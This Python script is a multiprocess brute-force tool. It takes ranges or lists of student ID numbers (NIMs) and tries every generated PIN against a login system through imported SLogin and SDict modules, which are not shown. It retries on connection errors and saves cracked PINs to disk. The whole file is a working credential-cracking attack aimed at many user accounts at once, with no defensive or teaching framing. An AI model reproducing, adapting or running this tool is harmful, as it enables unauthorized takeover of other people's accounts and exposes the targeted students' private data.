#!/usr/bin/env python3.6

import multiprocessing  # Pool, Manager
import gc               # gc.collect
import time             # time.time
import requests         # request.post
import logging          # logging
import os               # os.remove

from SLogin import SLogin
from SDict import SDict


def init_logging(logFileName):
    logFormatter = logging.Formatter(
        fmt="[%(asctime)s][%(levelname)s] %(message)s",
        datefmt='%d-%b-%y %H:%M:%S')

    rootLogger = logging.getLogger()

    fileHandler = logging.FileHandler(logFileName, mode='a')
    fileHandler.setFormatter(logFormatter)
    rootLogger.addHandler(fileHandler)

    consoleHandler = logging.StreamHandler()
    consoleHandler.setFormatter(logFormatter)
    rootLogger.addHandler(consoleHandler)

    rootLogger.setLevel(logging.INFO)


def login(nim, pin, found, counter, depth=0):
    """Login into specified URL inside this function.
    Please edit the target and success message
    in this function declarataion as needed
    """
    MAX_RETRY = 64   # please edit this if you need more retry

    if not found.value:
        try:
            with SLogin(nim, pin) as connection:
                if connection.login():
                    found.value = True
                    return pin
        except (requests.ConnectTimeout, requests.ConnectionError, requests.ConnectTimeout) as ex:
            logging.debug(
                '{} occured {} {}, {} of {} retries'.format(str(ex), nim, pin, depth, MAX_RETRY))
            if depth < MAX_RETRY:
                depth += 1
                return login(nim, pin, found, counter, depth)
            else:
                logging.critical(
                    'Max Retry Exceeded for this exception: {}'.format(str(ex)))
                raise ex
        finally:
            counter.value = (
                counter.value + 1) if depth == 0 else counter.value


def brute(nim, process_count):
    start_time = time.time()
    logging.info('Start bruteforce for {} '.format(nim))
    found = multiprocessing.Manager().Value('I', 0)
    counter = multiprocessing.Manager().Value('I', 0)

    # check saved pin first
    try:
        filename = 'found/{}'.format(nim)
        with open(filename, 'r') as f:
            pin = f.read()
            logging.info('Saved pin found for {}, trying it.'.format(nim))
    except FileNotFoundError:
        pass
    else:
        result = login(nim, pin, found, counter)
        if result == pin:
            logging.info('Saved pin is good.')
            return
        else:
            logging.warning('Saved pin is bad, trying normal method.')
            os.remove(filename)

    with multiprocessing.Pool(process_count) as pool:
        result = list(pool.starmap(
            login, [[nim, pin, found, counter] for pin in SDict(nim)]))

    result = list(set(result))
    result.remove(None)
    total_time = time.time() - start_time

    if len(result) == 1:
        with open('found/{}'.format(nim), 'w') as logfile:
            logfile.write(result[0])
            logmsg = 'FOUND {} {}'.format(nim, result[0])
    else:
        logmsg = 'FAILED {}' .format(nim)
    logging.info('{} in {:.2f}s'.format(logmsg, total_time))


def parse_argument():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--retry",
                        metavar="N",
                        default=4,
                        type=int,
                        help="number of max retry if exception occured, default is 4")
    parser.add_argument("--infile",
                        metavar="PATH",
                        help="txt file containing targets to bruteforce")
    parser.add_argument("--outfile",
                        metavar="PATH",
                        default="temp.txt",
                        help="txt file to write if not all target is tried, default is temp.txt")
    parser.add_argument("--logfile",
                        metavar="PATH",
                        default="log.txt",
                        help="log file destination")
    parser.add_argument("--target",
                        metavar="TARGET",
                        type=int,
                        help="target NIM to bruteforce",
                        nargs="+")
    parser.add_argument("--range",
                        metavar=("START", "END"),
                        type=int,
                        nargs=2,
                        help="range of target NIM to bruteforce, END is included in the range")
    parser.add_argument('-p', '--process',
                        metavar="N",
                        type=int,
                        default=multiprocessing.cpu_count(),
                        help="Specify number of process to use, default value is CPU Count. It's more limiting to RAM than CPU, use with CAUTION!!!")
    return parser.parse_args()


def main():
    args = parse_argument()
    init_logging(args.logfile)

    # parse and gather all target
    target = []
    done = []
    if args.infile:
        try:
            with open(args.infile, 'r') as filetarget:
                target += filetarget.read().split('\n')
        except FileNotFoundError:
            logging.warning('Input file not found.')
    if args.target:
        target += args.target
    if args.range:
        target += [n for n in range(args.range[0], args.range[1]+1)]
    if target == []:
        logging.critical('Target is empty!')
        exit(1)

    logging.info("Starting bruteforce with {} process(es) for {} target(s)".format(
        args.process, len(target)))

    try:
        for nim in target:
            brute(nim=nim, process_count=args.process)
            done.append(nim)
            gc.collect()
    except KeyboardInterrupt:
        logging.info('Interrupted by user input')
    except Exception as ex:
        logging.exception('Exception occured: {}'.format(str(ex)))
    finally:
        if not len(done) == len(target):
            logging.info(
                'Program terminated prematurely. Writing remaining target to temp.txt')
            with open(args.outfile, 'w') as outfile:
                outfile.write('\n'.join([str(t)
                                         for t in target if t not in done]))


if __name__ == '__main__':
    main()
